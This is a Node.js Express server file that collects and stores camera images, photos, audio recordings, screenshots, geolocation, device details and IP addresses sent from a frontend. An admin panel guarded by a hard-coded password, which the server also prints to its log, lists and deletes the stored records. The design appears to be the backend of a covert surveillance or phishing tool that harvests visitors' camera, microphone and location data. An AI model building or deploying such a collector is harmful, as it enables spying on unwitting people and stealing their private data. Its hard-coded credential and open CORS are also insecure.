const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = 8080;

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.static(path.join(__dirname, '../frontend')));

let allData = [];
let idCounter = 1;

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, '../frontend/admin.html'));
});

app.post('/api/store', (req, res) => {
    try {
        const { cameraImage, location, deviceDetails, screenshot, userPhoto, audioData, ipAddress } = req.body;
        allData.unshift({
            _id: 'id_' + idCounter++,
            cameraImage: cameraImage || null,
            location: location || { lat: 0, lng: 0 },
            deviceDetails: deviceDetails || {},
            screenshot: screenshot || null,
            userPhoto: userPhoto || null,
            audioData: audioData || null,
            ipAddress: ipAddress || 'Unknown',
            timestamp: new Date().toISOString()
        });
        console.log('✅ Stored! Total:', allData.length);
        res.json({ success: true, message: 'Data stored!', id: 'id_' + (idCounter-1) });
    } catch(err) {
        res.json({ success: false, error: err.message });
    }
});

// IP Address detect karne ka API
app.get('/api/get-ip', (req, res) => {
    try {
        const ip = req.headers['x-forwarded-for'] || 
                   req.connection.remoteAddress || 
                   req.socket.remoteAddress || 
                   'Unknown';
        res.json({ success: true, ip: ip });
    } catch(err) {
        res.json({ success: false, error: err.message });
    }
});

app.post('/api/admin/get-data', (req, res) => {
    try {
        const { password } = req.body;
        if (password !== 'admin123#@!') {
            return res.json({ success: false, message: 'Wrong password!' });
        }
        res.json({ success: true, count: allData.length, data: allData });
    } catch(err) {
        res.json({ success: false, error: err.message });
    }
});

app.post('/api/admin/delete', (req, res) => {
    try {
        const { password, id } = req.body;
        if (password !== 'admin123#@!') {
            return res.json({ success: false, message: 'Wrong password!' });
        }
        allData = allData.filter(item => item._id !== id);
        res.json({ success: true });
    } catch(err) {
        res.json({ success: false, error: err.message });
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server: http://localhost:${PORT}`);
    console.log(`🔑 Admin Password: admin123#@!`);
});
